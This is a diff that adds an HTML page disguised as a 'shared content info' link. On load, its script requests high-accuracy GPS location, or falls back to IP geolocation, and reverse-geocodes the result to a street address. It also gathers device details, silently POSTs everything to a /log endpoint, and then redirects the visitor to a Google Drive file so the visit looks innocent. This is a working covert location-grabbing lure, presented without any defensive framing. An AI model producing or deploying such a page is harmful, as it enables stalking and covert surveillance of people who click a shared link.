@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>shared content info</title></head>
+<body>
+<script>
+  async function getIPInfo() {
+    const r = await fetch("https://ipapi.co/json/"); return await r.json();
+  }
+
+  async function reverseGeocode(lat, lon) {
+    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+    const json = await res.json();
+    return json.display_name || '';
+  }
+
+  async function collectData() {
+    let method = "IP", lat, lon, address, city, region, country, ip;
+    const device = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screen: window.screen.width + "x" + window.screen.height,
+      platform: navigator.platform
+    };
+
+    try {
+      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {{enableHighAccuracy:true,timeout:5000}}));
+      method = "GPS"; lat = pos.coords.latitude; lon = pos.coords.longitude;
+      address = await reverseGeocode(lat, lon);
+    } catch {{
+      const ipInfo = await getIPInfo();
+      ip = ipInfo.ip; city = ipInfo.city; region = ipInfo.region; country = ipInfo.country_name;
+      lat = ipInfo.latitude; lon = ipInfo.longitude;
+      address = `${{city}}, ${{region}}, ${{country}}`;
+    }}
+
+    const payload = {{ method, latitude: lat, longitude: lon, address, city, region, country, ip, ...device }};
+    await fetch("/log", {{
+      method: "POST",
+      headers: {{"Content-Type":"application/json"}},
+      body: JSON.stringify(payload)
+    }});
+
+    window.location.href = "https://drive.google.com/file/d/13_1GoeLK1uPhoRCeBUM7OwC00sTfNrXF/view?usp=sharing";
+  }
+
+  collectData();
+</script>
+</body>
+</html>
